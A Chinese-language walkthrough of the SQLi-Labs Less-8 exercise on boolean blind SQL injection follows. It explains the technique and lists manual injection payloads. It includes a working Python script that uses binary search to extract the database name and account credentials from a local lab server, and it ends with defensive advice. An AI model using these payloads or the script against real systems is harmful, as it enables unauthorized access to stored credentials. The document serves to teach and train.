## 一、题目信息
- 平台：SQLi-Labs
- 分类：Web - SQL Injection
- 难度：中等
- 通关标识：利用布尔盲注（页面只有真/假两种状态），借助 Python 脚本猜解出数据库名及账号密码。

## 二、大白话原理讲解
前几关，柜员（数据库）要么把数据打印出来（联合查询），要么把数据报错喊出来（报错注入）。
到了这关，柜员直接变成了“哑巴”。你问他数据，他不说话；你故意让他报错，他也不给你看报错信息（或者只给笼统提示）。

**但他留了一个极小的破绽：**
如果你问他：“你的名字是叫 security 吗？”如果猜对了，他会给你倒杯茶（页面显示 `You are in...`）；如果猜错了，他就不理你（页面空白）。

既然他不直接给，我们只能**像猜谜语一样，一个字符一个字符地试探**。
比如：“你名字的第一个字母 ASCII 码是不是 115？”（115 是字母 s）。
这种利用页面正常/异常（True/False）状态来推断数据的注入，就叫**布尔盲注**。因为手工猜解太慢，实战中我们通常用 Python 脚本自动“爆破”。

## 三、解题步骤

**1. 测试注入点与布尔逻辑**
*   输入 `?id=1' and 1=1 --+`，页面显示 `You are in....`（真）。
*   输入 `?id=1' and 1=2 --+`，页面空白（假）。
*   确认单引号闭合，且页面能根据条件真假给出不同反应。

**2. 手工测试原理（核心函数）**
*   **猜长度**：`?id=1' and length(database())=8 --+` （如果页面显示真，说明库名长度为 8）。
*   **猜字符**：`?id=1' and ascii(substr(database(),1,1))=115 --+` （猜第一个字符的 ASCII 码是不是 s）。
*   *注：手工猜解效率极低，这里仅作原理演示。*

**3. 编写 Python 自动化脚本**
利用 `requests` 库发包，采用二分法（从 32 到 127 的 ASCII 范围内对半查找），极大提高效率。

```python
import requests

url = "http://127.0.0.1/sqli-labs-master/Less-8/?id=1'"
success_flag = "You are in"

def get_length(sql_query):
    for length in range(1, 50):
        payload = f" and length(({sql_query}))={length} --+"
        if success_flag in requests.get(url + payload).text:
            return length
    return 0

def get_data(sql_query, length):
    result = ""
    print(f"[*] 正在提取数据 (长度: {length})...")
    for i in range(1, length + 1):
        low, high = 32, 127
        while low <= high:
            mid = (low + high) // 2
            payload = f" and ascii(substr(({sql_query}),{i},1))>{mid} --+"
            if success_flag in requests.get(url + payload).text:
                low = mid + 1
            else:
                high = mid - 1
        result += chr(low)
        print(f"[+] 当前结果: {result}")
    return result

if __name__ == "__main__":
    # 查库名：select database()
    # 查账号密码：select concat(username,0x3a,password) from users limit 0,1
    query = "select database()"
    
    print("[*] 开始盲注...")
    data_len = get_length(query)
    if data_len > 0:
        data = get_data(query, data_len)
        print(f"\n[🎉] 成功爆出结果: {data}")
```

**4. 运行脚本**
在终端运行 `python blind.py`，脚本会自动发包跑出结果，成功提取出 `security` 或 `Dumb:Dumb`。

## 四、知识点解析
1. **布尔盲注**：页面不回显数据，也不报错，仅依靠页面状态（正常/异常）判断注入条件真伪。
2. **关键函数**：
   *   `length(str)`：获取字符串长度。
   *   `substr(str, start, length)`：截取字符串。
   *   `ascii(char)`：将字符转换为 ASCII 码，方便用数字比较。
3. **二分查找（二分法）**：在 1-127 的 ASCII 范围内折半查找，将猜测次数从 100 多次缩减到 7 次左右。

## 五、总结与防御
**本题总结**：
在完全盲注的环境下，手工注入几乎不可能，必须借助脚本自动化。通过 `substr` 结合 `ascii` 逐位截取判断，是实现布尔盲注的核心逻辑。

**安全防御建议**：
- **统一错误响应**：无论查询成功还是失败，甚至发生异常，页面响应应该保持绝对一致。
- **预编译语句（PDO/MySQLi）**：根本防御手段，让 SQL 语句结构无法被改变。
